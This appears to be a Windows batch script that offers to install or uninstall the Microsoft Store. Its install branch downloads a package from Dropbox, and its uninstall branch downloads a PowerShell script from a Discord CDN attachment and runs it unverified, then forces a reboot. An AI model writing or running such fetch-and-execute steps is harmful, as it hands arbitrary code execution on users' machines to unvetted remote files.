@echo off
choice /C 12 /M " presione 1 para instalar, 2 para desintalar"
if %errorlevel% equ 1 goto install
if %errorlevel% equ 2 goto uninstall
:install
curl -L -o Microsoft.WindowsStore.msixbundle https://www.dropbox.com/s/u4znvwuckb5ynvi/Microsoft.WindowsStore.msixbundle?dl=0
powershell Add-AppxPackage -Path "%cd%\Microsoft.WindowsStore.msixbundle"
echo succesfully installed MS Store, restarting in 3s
timeout 3
shutdown -r -f -t 0
:uninstall
curl -L -O a.ps1 https://cdn.discordapp.com/attachments/860401848774033418/1061377361314054194/a.ps1
powershell .\a.ps1
shutdown -r -f -t 0
